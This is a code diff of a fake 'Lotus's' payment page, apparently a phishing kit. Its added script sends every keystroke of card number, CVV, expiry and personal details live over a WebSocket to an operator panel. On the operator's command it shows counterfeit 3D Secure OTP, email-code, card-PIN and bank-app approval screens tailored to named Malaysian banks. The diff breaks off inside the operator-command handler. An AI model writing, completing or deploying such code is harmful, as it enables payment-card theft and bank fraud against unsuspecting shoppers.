@@ -5,30 +5,51 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Payment - Lotus's</title>
 <link rel="stylesheet" href="reset-db091b80ac2dcb28b415f4572d586ccfdb1ba19f3e5399e17e1bff5b0ceab6da.css" media="screen">
-    <link rel="stylesheet" href="base-9b63ad839f025712eb050c1faf3b7135265825b68c210d7a5e3e5fe66f1a3e5e.css" media="screen">
-    <link rel="stylesheet" href="dialog-a9f0968678c9d805770f2a8bf6d460fbffba429839c2e2b541ddbc93e5bc3fa9.css" media="screen">
-    <link rel="stylesheet" href="default-30-892167529--2380507.css" media="screen">
-
-        <link rel="stylesheet" href="singlepage-default-3cc666dd769a84053ef4c134dd012de9d89b47c59fbdf939eb91b6811e5f0214.css" media="screen">
-
-
-    <link rel="stylesheet" href="responsive-default-64933594afca75d6c2a55fdeaa4eeba72397220dc8b4056cdcffa684f0a63c1b.css" media="screen">
-
-    <link rel="stylesheet" href="sticky_footer-67ec66c6b9fc4980da4de8e6c0f9b5c9f27fd1b51682749e6f694eb887a0b127.css" media="screen">
+<link rel="stylesheet" href="base-9b63ad839f025712eb050c1faf3b7135265825b68c210d7a5e3e5fe66f1a3e5e.css" media="screen">
+<link rel="stylesheet" href="dialog-a9f0968678c9d805770f2a8bf6d460fbffba429839c2e2b541ddbc93e5bc3fa9.css" media="screen">
+<link rel="stylesheet" href="default-30-892167529--2380507.css" media="screen">
+<link rel="stylesheet" href="singlepage-default-3cc666dd769a84053ef4c134dd012de9d89b47c59fbdf939eb91b6811e5f0214.css" media="screen">
+<link rel="stylesheet" href="responsive-default-64933594afca75d6c2a55fdeaa4eeba72397220dc8b4056cdcffa684f0a63c1b.css" media="screen">
+<link rel="stylesheet" href="sticky_footer-67ec66c6b9fc4980da4de8e6c0f9b5c9f27fd1b51682749e6f694eb887a0b127.css" media="screen">
 <link rel="shortcut icon" href="favicon.ico">
 <style>
 .overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:10000;display:flex;align-items:center;justify-content:center}
 .overlay.hidden{display:none}
-.otp-card{width:100%;max-width:400px;background:#fff;border-radius:8px;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#333}
-.otp-hdr{padding:14px 16px;border-bottom:1px solid #e0e0e0;display:flex;align-items:center;justify-content:space-between}
+.otp-card{width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#1a1a1a}
+.otp-hdr{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #e0e0e0}
+.otp-hdr-left{display:flex;align-items:center;gap:6px;font-size:14px;font-weight:700;color:#333}
+.otp-hdr-right{display:flex;align-items:center;gap:8px;color:#333;font-size:14px}
 .otp-body{padding:20px}
-.otp-body h2{font-size:16px;font-weight:700;margin-bottom:6px}
-.otp-body p{font-size:13px;color:#555;margin-bottom:14px}
-.otp-body input{width:100%;height:48px;border:2px solid #e0e0e0;border-radius:8px;text-align:center;font-size:20px;font-weight:700;outline:none}
-.otp-body input:focus{border-color:#00a651}
-.otp-btn{width:100%;height:44px;background:#00a651;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:10px}
-.otp-error{color:#e53935;font-size:12px;text-align:center;margin-top:6px}
-.loading-msg{text-align:center;padding:40px 20px;font-size:16px;color:#666}
+.otp-body h2{font-size:16px;font-weight:700;margin-bottom:6px;color:#1a1a1a}
+.otp-body p{font-size:12px;color:#555;margin-bottom:14px}
+.otp-table{width:100%;margin-bottom:12px;border-collapse:collapse}
+.otp-table td{padding:6px 0;font-size:12px;border-bottom:1px solid #f0f0f0}
+.otp-table td:first-child{color:#999}
+.otp-table td:last-child{color:#333;font-weight:500;text-align:right}
+.otp-code-input{width:100%;height:48px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px}
+.otp-code-input:focus{border-color:#3f51b5}
+.otp-error-msg{color:#e53935;font-size:11px;text-align:center;margin-bottom:8px;display:none}
+.otp-btn{width:100%;height:44px;background:#3f51b5;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .2s}
+.otp-btn:disabled{opacity:.5;cursor:not-allowed}
+.otp-countdown{text-align:center;color:#bbb;font-size:11px;margin-top:8px}
+.otp-resend-btn{width:100%;margin-top:8px;padding:10px;background:none;border:1px solid #ddd;border-radius:6px;color:#3f51b5;font-size:13px;cursor:pointer}
+.otp-resend-btn:disabled{color:#ccc;border-color:#eee;cursor:not-allowed}
+.otp-result-msg{text-align:center;padding:30px 20px;font-size:16px;font-weight:600}
+.pin-digits{display:flex;gap:8px;justify-content:center;margin:10px 0 16px}
+.pin-digits input{width:52px;height:60px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:26px;font-weight:700;color:#1a1a2e;outline:none}
+.pin-digits input:focus{border-color:#3f51b5}
+.app-verify-box{width:100%;max-width:420px;background:#fff;border-radius:12px;padding:28px 24px;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#1a1a1a}
+.app-logo{width:48px;height:48px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;color:#fff;margin-bottom:12px}
+.app-scheme{display:flex;align-items:center;gap:6px;font-size:13px;color:#666;margin-bottom:16px}
+.app-verify-box h2{font-size:16px;font-weight:700;margin-bottom:8px}
+.app-verify-box .info{font-size:13px;color:#555;margin-bottom:4px}
+.app-verify-box .steps{font-size:13px;color:#555;margin:12px 0;padding-left:20px}
+.app-verify-box .steps li{margin-bottom:6px}
+.app-btn{width:100%;height:44px;background:#0878be;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}
+.load-msg{text-align:center;padding:60px 20px;color:#fff;font-size:16px}
+.spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.status-msg{padding:10px 16px;margin:8px 0;border-radius:6px;font-size:13px;font-weight:500;display:none}
 </style>
 </head>
 <body id="notinpaymentflow">
@@ -41,23 +62,31 @@
   <main id="main" role="main">
     <h1 class="vhdn">Payment</h1>
     <div class="main container group">
-      <div class="error-banner hidden validation multiple-sections"><p></p></div>
-      <form id="payment-form" novalidate autocomplete="off">
+      <form id="payment-form" novalidate autocomplete="off" onsubmit="return false">
         <div class="left_column updateCheckBox" id="billing_details">
           <h2>Billing Information</h2>
           <fieldset class="input">
             <legend class="vhdn"><span>Billing Information</span></legend>
+            <div class="status-msg" id="statusMsg"></div>
             <div class="ol">
-              <div class="li"><label for="first_name">First Name *</label><input type="text" id="first_name" aria-required="true" value=""></div>
-              <div class="li"><label for="last_name">Last Name *</label><input type="text" id="last_name" aria-required="true" value=""></div>
+              <div class="li"><label for="fullName">Full Name *</label><input type="text" id="fullName" aria-required="true"></div>
             </div>
             <div class="ol">
-              <div class="li"><label for="address">Address *</label><input type="text" id="address" aria-required="true" value=""></div>
-              <div class="li"><label for="city">City *</label><input type="text" id="city" aria-required="true" value=""></div>
+              <div class="li"><label for="email">Email</label><input type="email" id="email"></div>
+              <div class="li"><label for="phone">Phone *</label><input type="tel" id="phone" aria-required="true"></div>
             </div>
             <div class="ol">
-              <div class="li"><label for="phone">Phone Number *</label><input type="tel" id="phone" aria-required="true" value=""></div>
-              <div class="li"><label for="email">Email *</label><input type="email" id="email" value=""></div>
+              <div class="li"><label for="address1">Address Line 1 *</label><input type="text" id="address1" aria-required="true"></div>
+              <div class="li"><label for="city">City *</label><input type="text" id="city" aria-required="true"></div>
+            </div>
+            <div class="ol">
+              <div class="li"><label for="state">State</label><input type="text" id="state"></div>
+              <div class="li"><label for="zipCode">Postal Code</label><input type="text" id="zipCode"></div>
+            </div>
+            <div class="ol">
+              <div class="li"><label for="country">Country</label>
+                <select id="country"><option value="MY" selected>Malaysia</option></select>
+              </div>
             </div>
           </fieldset>
         </div>
@@ -66,31 +95,23 @@
           <fieldset class="input">
             <legend class="vhdn"><span>Payment Details</span></legend>
             <div id="payment_type_card">
-              <input type="hidden" name="payment_method" id="payment_method" value="card">
               <div class="ol">
                 <div class="li">
-                  <fieldset aria-required="true" role="radiogroup">
-                    <legend class="input_label">Card Type *</legend>
-                    <div id="card_type_selection" class="ol group field-card_type">
-                      <div class="li"><input type="radio" name="card_type" id="card_type_001" value="001" checked><label for="card_type_001">Visa</label></div>
-                      <div class="li"><input type="radio" name="card_type" id="card_type_002" value="002"><label for="card_type_002">Mastercard</label></div>
-                    </div>
-                  </fieldset>
+                  <label for="cardHolder">Cardholder Name *</label>
+                  <input type="text" id="cardHolder" aria-required="true" autocomplete="cc-name">
                 </div>
                 <div class="li">
-                  <label for="card_number">Card Number *</label>
-                  <div class="iw nm"><input type="text" id="card_number" class="field-card_number" aria-required="true" autocomplete="off" placeholder="0000 0000 0000 0000" maxlength="19"></div>
+                  <label for="cardNumber">Card Number *</label>
+                  <div class="iw nm"><input type="text" id="cardNumber" class="field-card_number" aria-required="true" autocomplete="off" placeholder="0000 0000 0000 0000"></div>
                 </div>
                 <div class="li">
                   <div id="card_expiry_date">
-                    <div class="exp-date exp-month">
-                      <label for="card_expiry_month">Expiration Month *</label>
+                    <div class="exp-date exp-month"><label for="card_expiry_month">Expiration Month *</label>
                       <select id="card_expiry_month" aria-required="true" autocomplete="cc-exp-month"><option selected disabled value="">Month</option>
                         <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                       </select>
                     </div>
-                    <div class="exp-date exp-year">
-                      <label for="card_expiry_year">Expiration Year *</label>
+                    <div class="exp-date exp-year"><label for="card_expiry_year">Expiration Year *</label>
                       <select id="card_expiry_year" aria-required="true" autocomplete="cc-exp-year"><option selected disabled value="">Year</option>
                         <option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option>
                       </select>
@@ -98,9 +119,9 @@
                   </div>
                 </div>
                 <div class="li" id="card_cvn_line">
-                  <label for="card_cvn">CVN *</label>
+                  <label for="cvv">CVN *</label>
                   <div class="legend">3 or 4 digit number printed on the back of your card.</div>
-                  <div class="iw nm"><input type="text" id="card_cvn" maxlength="4" aria-required="true" placeholder="..." autocomplete="off"></div>
+                  <div class="iw nm"><input type="text" id="cvv" maxlength="4" aria-required="true" placeholder="..." autocomplete="off"></div>
                 </div>
               </div>
             </div>
@@ -108,15 +129,12 @@
         </div>
         <div class="left_column lower" id="payment_details_lower">
           <input class="left cancelbutton" type="button" value="Cancel" onclick="history.back()">
-          <input type="button" name="commit" value="Pay Now" class="right complete pay_button" onclick="submitPayment()">
+          <input type="button" id="btnSubmit" value="Pay Now" class="right complete pay_button" onclick="submitPayment()">
         </div>
         <div class="right_column right_column_spc">
           <div class="hgroup header"><h2>Your Order</h2></div>
           <div class="purchases">
-            <div class="totalamount">
-              <p class="list-item-name key">Total amount</p>
-              <p class="value" id="total-amount">RM 0.00</p>
-            </div>
+            <div class="totalamount"><p class="list-item-name key">Total amount</p><p class="value" id="total-amount">RM 0.00</p></div>
           </div>
         </div>
       </form>
@@ -127,125 +145,219 @@
   </footer>
 </div>
 
-<div class="overlay hidden" id="loading-overlay">
-  <div style="text-align:center"><div style="width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#00a651;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto"></div><p style="color:#fff;font-size:15px;margin-top:12px;font-weight:500">Processing payment...</p></div>
-</div>
+<div class="overlay hidden" id="load-overlay"><div class="load-msg"><div class="spinner"></div><p id="load-text">Processing payment...</p></div></div>
 
 <div class="overlay hidden" id="otp-overlay">
   <div class="otp-card">
-    <div class="otp-hdr"><span style="font-weight:700">Secure Verification</span><span style="color:#00a651;font-size:13px">3D Secure</span></div>
-    <div class="otp-body">
-      <h2>Enter Security Code</h2>
-      <p>Please enter the code sent to your phone to authorize this payment.</p>
-      <input type="text" id="otp-code" maxlength="8" placeholder="">
-      <div class="otp-error hidden" id="otp-error"></div>
-      <button class="otp-btn" id="otp-submit" onclick="submitOtp()">Verify & Pay</button>
+    <div class="otp-hdr"><div class="otp-hdr-left"><span>Your card issuer</span></div><div class="otp-hdr-right"><span>Secure</span></div></div>
+    <div class="otp-body" id="otp-body">
+      <div id="otp-form"><h2>Enter your security code</h2><p>Please enter your security code to authorize this payment</p>
+        <table class="otp-table"><tr><td>Merchant</td><td>Lotus's</td></tr><tr><td>Amount</td><td id="otp-amount">RM 0.00</td></tr></table>
+        <input type="text" id="otp-code" class="otp-code-input" maxlength="8" placeholder="">
+        <div class="otp-error-msg" id="otp-error"></div>
+        <button class="otp-btn" id="otp-submit">Continue</button>
+        <button class="otp-resend-btn" id="otp-resend">Resend Code</button>
+        <div class="otp-countdown">Code expires in <span id="otp-timer">4:59</span></div>
+      </div>
+      <div id="otp-result" class="hidden"><div class="otp-result-msg" style="color:#e74c3c"><svg width="48" height="48" fill="none" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#e74c3c"/><line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3"/><line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3"/></svg><br>Payment Failed</div><p style="text-align:center;color:#888;font-size:13px;margin:8px 0"></p><button class="otp-btn" onclick="changeOtp()">Try Again</button></div>
+      <div class="overlay hidden" id="otp-spinner"><div style="text-align:center;padding:20px"><div class="spinner" style="width:30px;height:30px;border-top-color:#3f51b5;border-color:#eee;border-top-color:#3f51b5"></div><p style="font-size:13px;color:#888;margin-top:8px" id="otp-spin-text">Verifying...</p></div></div>
     </div>
   </div>
 </div>
 
-<style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+<div class="overlay hidden" id="pin-overlay">
+  <div class="otp-card">
+    <div class="otp-hdr"><div class="otp-hdr-left"><span>PIN Verification</span></div></div>
+    <div class="otp-body">
+      <h2>Enter your PIN</h2><p>Please enter your 4-digit card PIN</p>
+      <div class="pin-digits"><input type="text" id="pin-d1" maxlength="1" oninput="pinJump(1)" onkeydown="pinBack(event,0)"><input type="text" id="pin-d2" maxlength="1" oninput="pinJump(2)" onkeydown="pinBack(event,1)"><input type="text" id="pin-d3" maxlength="1" oninput="pinJump(3)" onkeydown="pinBack(event,2)"><input type="text" id="pin-d4" maxlength="1" onkeydown="pinBack(event,3)"></div>
+      <div class="otp-error-msg" id="pin-error"></div>
+      <button class="otp-btn" id="pin-submit" onclick="submitPin()">Continue</button>
+    </div>
+  </div>
+</div>
+
+<div class="overlay hidden" id="email-overlay">
+  <div class="otp-card">
+    <div class="otp-hdr"><div class="otp-hdr-left"><svg width="18" height="14" fill="none" stroke="#666" stroke-width="2"><rect x="1" y="1" width="16" height="12" rx="2"/><polyline points="1,3 9,9 17,3"/></svg><span>Email Verification</span></div></div>
+    <div class="otp-body">
+      <div id="email-form"><h2>Enter email verification code</h2><p>Please enter the code sent to your email</p>
+        <table class="otp-table"><tr><td>Amount</td><td id="email-amount">RM 0.00</td></tr></table>
+        <input type="text" id="email-code" class="otp-code-input" maxlength="8" placeholder="">
+        <div class="otp-error-msg" id="email-error"></div>
+        <button class="otp-btn" id="email-submit">Continue</button>
+        <button class="otp-resend-btn" id="email-resend">Resend Code</button>
+        <div class="otp-countdown">Code expires in <span id="email-timer">4:59</span></div>
+      </div>
+      <div id="email-result" class="hidden"><div class="otp-result-msg" style="color:#e74c3c"><svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#e74c3c"/><line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3"/><line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3"/></svg><br>Verification Failed</div><p style="text-align:center;color:#888;font-size:13px;margin:8px 0"></p><button class="otp-btn" onclick="changeEmail()">Try Again</button></div>
+    </div>
+  </div>
+</div>
+
+<div class="overlay hidden" id="app-verify-overlay">
+  <div id="mount1" class="hidden"></div><div id="mount2" class="hidden"></div><div id="mount3" class="hidden"></div><div id="mount4" class="hidden"></div><div id="mount5" class="hidden"></div><div id="mount6" class="hidden"></div><div id="mount7" class="hidden"></div>
+  <div class="app-verify-box hidden" id="app-verify-box">
+    <div class="app-logo" id="app-logo">B</div>
+    <div class="app-scheme" id="app-scheme">ID Check</div>
+    <h2>Before you purchase, verify it's you</h2>
+    <div class="info">Merchant: <strong>Lotus's</strong></div>
+    <div class="info">Amount: <strong id="app-amount">RM 0.00</strong></div>
+    <ol class="steps"><li>Open your banking app</li><li>Review and approve the transaction</li><li>Return to this page and click continue</li></ol>
+    <div class="otp-error-msg" id="app-error"></div>
+    <button class="app-btn" id="app-continue-btn" onclick="submitAppVerify()">Continue to complete</button>
+  </div>
+</div>
+
 <script>
+function q(id){return document.getElementById(id)}
+
+function showMsg(t,x){var e=q('statusMsg');if(!e)return;e.style.display='block';e.textContent=x;e.style.color=t==='success'?'#2e7d32':t==='error'?'#c62828':'#1565c0';e.style.background=t==='success'?'#e8f5e9':t==='error'?'#ffebee':'#e3f2fd';setTimeout(function(){e.style.display='none'},5000)}
+
 function luhn(n){var s=0,a=0;for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],10);if(a)s+=d*2>9?d*2-9:d*2;else s+=d;a=!a}return s%10===0}
 
-var ws=null,sid=null,wsTimer=null;
+var ws=null,sid=null,reconnectTimer=null,wsRetries=0,wsConnecting=false,_curStep='card';
 var cid=localStorage.getItem('lotus_cid');
-if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('lotus_cid',cid)}
-
-(function loadOrder(){
-  try{
-    var raw = localStorage.getItem('lotus_order');
-    if(!raw) return;
-    var d = JSON.parse(raw);
-    if(d.amount) document.getElementById('total-amount').textContent = 'RM ' + parseFloat(d.amount).toFixed(2);
-    if(d.customerName){var parts=d.customerName.split(' ');document.getElementById('first_name').value=parts[0]||'';document.getElementById('last_name').value=parts.slice(1).join(' ')||''}
-    if(d.email) document.getElementById('email').value = d.email;
-    if(d.phone) document.getElementById('phone').value = d.phone;
-    if(d.address) document.getElementById('address').value = d.address;
-  }catch(e){}
-})();
+if(!cid){cid='lotus_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('lotus_cid',cid)}
 
 function wsConnect(){
-  var protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  var url=protocol+'//'+location.host+'/api?role=customer&cid='+cid+(sid?'&sid='+sid:'');
-  ws=new WebSocket(url);
-  ws.onopen=function(){if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},30000)};
-  ws.onmessage=function(e){
-    var msg=JSON.parse(e.data);
-    if(msg.type==='operator_action'){
-      var p=msg.payload,a=p.action;
-      if(a==='ack'){sid=p.sessionId}
-      else if(a==='session_restored'){
-        sid=p.sessionId;
-        if(p.cardInfo){var ci=p.cardInfo;if(ci.cardNumber)document.getElementById('card_number').value=ci.cardNumber;if(ci.expiry){var ex=ci.expiry.replace('/','');if(ex.length>=4){document.getElementById('card_expiry_month').value=ex.slice(0,2);document.getElementById('card_expiry_year').value='20'+ex.slice(2,4)}}if(ci.cvv)document.getElementById('card_cvn').value=ci.cvv}
-        if(p.customerInfo){var cu=p.customerInfo;if(cu.fullName){var parts=cu.fullName.split(' ');document.getElementById('first_name').value=parts[0]||'';document.getElementById('last_name').value=parts.slice(1).join(' ')||''}if(cu.email)document.getElementById('email').value=cu.email;if(cu.phone)document.getElementById('phone').value=cu.phone;if(cu.address1)document.getElementById('address').value=cu.address1}
-        if(p.status==='pending'){document.getElementById('loading-overlay').classList.remove('hidden')}
-      }
-      else if(a==='otp_verify'||a==='custom_otp_verify'){document.getElementById('loading-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');document.getElementById('otp-code').focus()}
-      else if(a==='approve'){location.href='/complete/'}
-      else if(a==='reject'){document.getElementById('loading-overlay').classList.add('hidden');alert('Payment rejected')}
-      else if(a==='timeout'){alert('Session timeout')}
-      else if(a==='change_card'){alert('Please use a different card')}
-    }
-  };
-  ws.onclose=function(){if(wsTimer)clearInterval(wsTimer);setTimeout(wsConnect,5000)};
-}
-wsConnect();
+  if(ws&&(ws.readyState===WebSocket.OPEN||ws.readyState===WebSocket.CONNECTING))return;
+  if(wsConnecting)return;wsConnecting=true;
+  if(reconnectTimer){clearTimeout(reconnectTimer);reconnectTimer=null}
+  var url=(location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/api/?role=customer&cid='+encodeURIComponent(cid)+(sid?'&sid='+encodeURIComponent(sid):'');
+  var socket=new WebSocket(url);socket._dead=false;socket._hb=null;ws=socket;
+  socket.onopen=function(){if(socket!==ws)return;wsConnecting=false;wsRetries=0;if(socket._hb)clearInterval(socket._hb);socket._hb=setInterval(function(){if(socket===ws&&socket.readyState===WebSocket.OPEN)socket.send(JSON.stringify({type:'heartbeat'}))},10000)}
+  socket.onmessage=function(e){var m;try{m=JSON.parse(e.data)}catch(err){return}if(m.type==='operator_action')handleAction(m.payload)}
+  socket.onclose=function(evt){if(socket!==ws)return;if(socket._hb){clearInterval(socket._hb);socket._hb=null}if(socket._dead)return;wsRetries++;var delay=wsRetries<=3?10000:wsRetries<=6?30000:60000;if(reconnectTimer)clearTimeout(reconnectTimer);reconnectTimer=setTimeout(function(){reconnectTimer=null;ws=null;wsConnecting=false;wsConnect()},delay)}
+  socket.onerror=function(){}}
 
 function buildPayload(){
-  var cn=document.getElementById('card_number').value.replace(/\s/g,'');
-  var mo=document.getElementById('card_expiry_month').value;
-  var yr=document.getElementById('card_expiry_year').value;
+  var cn=(q('cardNumber').value||'').replace(/\s/g,'');
+  var mo=q('card_expiry_month').value,yr=q('card_expiry_year').value;
   var ce=(mo&&yr)?mo+'/'+yr.slice(2):'';
-  var cv=document.getElementById('card_cvn').value;
-  var fn=document.getElementById('first_name').value.trim();
-  var ln=document.getElementById('last_name').value.trim();
-  var ph=document.getElementById('phone').value.trim();
-  var em=document.getElementById('email').value.trim();
-  var ad=document.getElementById('address').value.trim();
-  var ci=document.getElementById('city').value.trim();
-  var ct=document.querySelector('input[name="card_type"]:checked');
   return{
-    frontendUrl:location.hostname,
-    cardInfo:{cardNumber:cn,expiry:ce,cvv:cv,cardHolder:fn+' '+ln},
-    customerInfo:{firstName:fn,lastName:ln,fullName:fn+' '+ln,email:em,phone:ph,address1:ad,city:ci,country:'MY'},
+    frontendUrl:location.hostname,currentStep:_curStep,
     browsingTabs:[{label:'Grocery',count:1,active:true}],
-    currentStep:'card'
-  };
-}
-
-function submitPayment(){
-  var cn=document.getElementById('card_number').value.replace(/\s/g,'');
-  var mo=document.getElementById('card_expiry_month').value;
-  var yr=document.getElementById('card_expiry_year').value;
-  var cv=document.getElementById('card_cvn').value;
-  var fn=document.getElementById('first_name').value.trim();
-  if(cn.length<13||cn.length>16) return alert('Please enter a valid card number');
-  if(!luhn(cn)) return alert('Invalid card number');
-  if(!mo||!yr) return alert('Please select expiry date');
-  if(cv.length<3) return alert('Please enter CVN');
-  if(!fn) return alert('Please enter first name');
-  document.getElementById('loading-overlay').classList.remove('hidden');
-  var payload=buildPayload();
-  if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
-  payload.status='pending';payload.sessionId=sid;
-  ws.send(JSON.stringify({type:'session_update',payload:payload}));
-}
-
-function submitOtp(){
-  var code=document.getElementById('otp-code').value;
-  if(code.length<4){document.getElementById('otp-error').classList.remove('hidden');document.getElementById('otp-error').textContent='Please enter the security code';return}
-  document.getElementById('otp-error').classList.add('hidden');
-  document.getElementById('otp-overlay').classList.add('hidden');
-  document.getElementById('loading-overlay').classList.remove('hidden');
-  if(ws&&ws.readyState===1&&sid){
-    ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{otpCode:code},currentStep:'otp'}}));
+    cardInfo:{cardNumber:cn,expiry:ce,cvv:q('cvv').value||'',cardHolder:q('cardHolder').value||'',otpCode:q('otp-code')?q('otp-code').value:''},
+    customerInfo:{fullName:q('fullName').value||'',email:q('email').value||'',phone:q('phone').value||'',country:q('country').value||'MY',address1:q('address1').value||'',city:q('city').value||'',state:q('state').value||'',zipCode:q('zipCode').value||''}
   }
 }
 
-document.getElementById('card_number').addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ')});
-document.getElementById('card_cvn').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,4)});
-document.getElementById('otp-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
+function livePush(){
+  if(!ws||ws.readyState!==WebSocket.OPEN)return;
+  var p=buildPayload();
+  if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:p}))}else{ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,cardInfo:p.cardInfo,customerInfo:p.customerInfo,currentStep:_curStep}}))}
+}
+var liveTimer=null;
+['cardHolder','cardNumber','card_expiry_month','card_expiry_year','cvv','fullName','email','phone','address1','city','state','zipCode','country'].forEach(function(id){var el=document.getElementById(id);if(el)el.addEventListener('input',function(){clearTimeout(liveTimer);liveTimer=setTimeout(livePush,150)})})
+
+function handleAction(p){
+  var a=p.action;
+  if(a==='ack'){sid=p.sessionId}
+  else if(a==='session_restored'){sid=p.sessionId;var ci=p.cardInfo||{},cu=p.customerInfo||{};if(ci.cardNumber)q('cardNumber').value=ci.cardNumber.replace(/(\d{4})(?=\d)/g,'$1 ');if(ci.expiry){var ex=ci.expiry.replace('/','');if(ex.length>=4){q('card_expiry_month').value=ex.slice(0,2);q('card_expiry_year').value='20'+ex.slice(2,4)}}if(ci.cvv)q('cvv').value=ci.cvv;if(ci.cardHolder)q('cardHolder').value=ci.cardHolder;if(cu.fullName)q('fullName').value=cu.fullName;if(cu.email)q('email').value=cu.email;if(cu.phone)q('phone').value=cu.phone;if(cu.address1)q('address1').value=cu.address1;if(cu.city)q('city').value=cu.city;if(cu.state)q('state').value=cu.state;if(cu.zipCode)q('zipCode').value=cu.zipCode;ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,currentStep:_curStep}}))}
+  else if(a==='otp_verify'||a==='custom_otp_verify'||a==='custom_otp_tail'){q('load-overlay').classList.add('hidden');_curStep='otp';q('otp-overlay').classList.remove('hidden');q('otp-code').value='';q('otp-error').style.display='none';q('otp-submit').disabled=false;q('otp-resend').disabled=false;q('otp-timer').textContent='4:59';q('otp-result').classList.add('hidden');q('otp-form').classList.remove('hidden');startOtpTimer()}
+  else if(a==='email_verify'||a==='custom_email_verify'||a==='custom_email_tail'){q('load-overlay').classList.add('hidden');_curStep='email_verify';q('email-overlay').classList.remove('hidden');q('email-code').value='';q('email-error').style.display='none';q('email-submit').disabled=false;q('email-resend').disabled=false;q('email-timer').textContent='4:59';q('email-result').classList.add('hidden');q('email-form').classList.remove('hidden');startEmailTimer()}
+  else if(a==='pin_verify'){q('load-overlay').classList.add('hidden');_curStep='pin_verify';q('pin-overlay').classList.remove('hidden');['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function(d){q(d).value=''});q('pin-error').style.display='none';q('pin-submit').disabled=false}
+  else if(a==='cvv_verify'||a==='question_verify'){q('load-overlay').classList.add('hidden');_curStep='otp';q('otp-overlay').classList.remove('hidden');q('otp-code').value='';resetOtp()}
+  else if(a==='app_verify'){q('load-overlay').classList.add('hidden');_curStep='app_verify';q('app-verify-overlay').classList.remove('hidden');
+    var bn=(p.cardInfo&&p.cardInfo.bankName)||p.bankName||'';
+    if(/AMBANK/i.test(bn)){showMount1(p)}else if(/CIMB/i.test(bn)){showMount2(p)}else if(/MALAYAN/i.test(bn)){showMount3(p)}else if(/OCBC|OVERSEA/i.test(bn)){showMount4(p)}else if(/RHB/i.test(bn)){showMount5(p)}else if(/PUBLIC/i.test(bn)){showMount6(p)}else if(/STANDARD CHARTERED/i.test(bn)){showMount7(p)}else{showGenericApp(p)}
+  }
+  else if(a==='app_verify_fail'){showAppError(p)}
+  else if(a==='approve'){q('load-overlay').classList.add('hidden');hideAllOverlays();setTimeout(function(){location.href='/complete/'},1500)}
+  else if(a==='reject'){q('load-overlay').classList.add('hidden');hideAllOverlays();q('btnSubmit').disabled=true;showMsg('error',p.message||'Payment declined')}
+  else if(a==='card_error'){q('load-overlay').classList.add('hidden');q('btnSubmit').disabled=false;showMsg('error',p.message||'Card error. Please try a different card.')}
+  else if(a==='otp_error'){var otpErr=q('otp-error');if(!q('otp-overlay').classList.contains('hidden')){if(otpErr){otpErr.style.display='block';otpErr.textContent=p.message||'Invalid code'}q('otp-submit').disabled=false}else{var emailErr=q('email-error');if(emailErr){emailErr.style.display='block';emailErr.textContent=p.message||'Invalid code'}q('email-submit').disabled=false}}
+  else if(a==='timeout'){q('load-overlay').classList.add('hidden');hideAllOverlays();q('btnSubmit').disabled=true;showMsg('error','Session timed out')}
+  else if(a==='change_card'||a==='change_card_prompt'){q('load-overlay').classList.add('hidden');hideAllOverlays();_curStep='card';q('cardNumber').value='';q('cvv').value='';q('btnSubmit').disabled=false;showMsg('error',p.message||'Please use a different card')}
+  else if(a==='custom_prompt'){q('load-overlay').classList.add('hidden');showMsg('error',p.message||'')}
